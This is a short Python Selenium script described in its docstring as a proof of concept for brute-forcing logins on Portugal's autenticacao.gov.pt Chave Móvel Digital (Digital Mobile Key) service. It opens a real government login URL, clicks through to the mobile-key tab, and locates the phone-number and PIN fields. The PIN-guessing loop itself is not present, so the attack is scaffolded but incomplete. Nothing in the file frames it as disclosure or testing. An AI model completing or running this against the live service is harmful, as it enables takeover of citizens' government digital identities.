"""
A simple Proof Of Concept script that bruteforces the logins
on the https://autenticacao.gov.pt Chave Móvel Digial (Digital Mobile Key)
login.
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def go_to_login_page(driver):
    driver.get('https://frtend.reg.cmd.autenticacao.gov.pt/Ama.Registry.Frontend/Processes/RegistryOnline/LoginOnline.aspx')

    dmk_tab = driver.find_element_by_id('ctl00_MainContent_tabCMD')
    dmk_tab.click()

    dmk_auth_btn = driver.find_element_by_id('ctl00_MainContent_Button2')
    dmk_auth_btn.click()

def attempt_login(driver, phone, pin):
    hidden_mobile_number_elem = driver.find_element_by_id('MainContent_hiddenMobile')
    pin_field = driver.find_element_by_id('MainContent_txtPin')

driver = webdriver.Chrome()
driver.implicitly_wait(10)

go_to_login_page(driver)
